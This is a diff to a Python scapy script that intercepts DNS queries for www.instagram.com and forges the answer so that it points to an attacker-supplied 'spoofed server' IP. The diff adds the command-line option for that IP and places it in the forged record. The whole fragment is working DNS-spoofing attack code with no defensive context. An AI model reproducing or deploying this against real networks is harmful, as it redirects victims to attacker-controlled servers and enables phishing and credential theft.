@@ -12,6 +12,8 @@ def parse_arguments():
     mode = parser.add_mutually_exclusive_group(required=True)
     mode.add_argument('-d', '--drop', action='store', help='Drop Packets')
     mode.add_argument('-f', '--forward', action='store', help='Forward Packets')
+
+    parser.add_argument('-s', '--server', type=str, required=True, help='Spoofed Server IP Address')
     return parser.parse_args()
 
 def process_packet(packet):
@@ -20,7 +22,7 @@ def process_packet(packet):
         qname = scapy_packet[scapy.DNSQR].qname
         if 'www.instagram.com' in qname:
             print('[+] Spoofing target')
-            answer = scapy.DNSRR(rrname=qname, rdata='')
+            answer = scapy.DNSRR(rrname=qname, rdata=options.server)
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
             del scapy_packet[scapy.IP].len
